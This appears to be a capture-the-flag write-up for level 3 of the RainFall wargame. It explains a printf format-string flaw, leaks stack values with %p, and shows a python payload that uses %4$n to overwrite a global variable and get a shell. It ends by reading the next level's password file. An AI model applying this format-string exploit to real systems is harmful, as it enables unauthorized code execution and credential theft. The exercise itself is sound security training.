# level 3

There is an exec level3, we bring to local data.
when dissasemble with ghidra we find function main() calls fn v().
v() checks if the variable m is equal to 64 bytes and then runs /bin/sh. 

Printf has some exploits in its formated string. so try to inject the address of m.

In C printf(), %n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n.

Locate the heap address. 

    level3@RainFall:~$ ./level3 
    aaaabbbbcccc %p %p %p %p %p %p %p
    aaaabbbbcccc 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x62626262 0x63636363 0x20702520

 we know 61616161 is aaaa so argv[1] is the 4th element on the memory.

 %4$n -> takes the 4th argument, given as \x8c\x98\x04\x08 (address of m)

    $ (python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")'; cat) | ./level3
    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
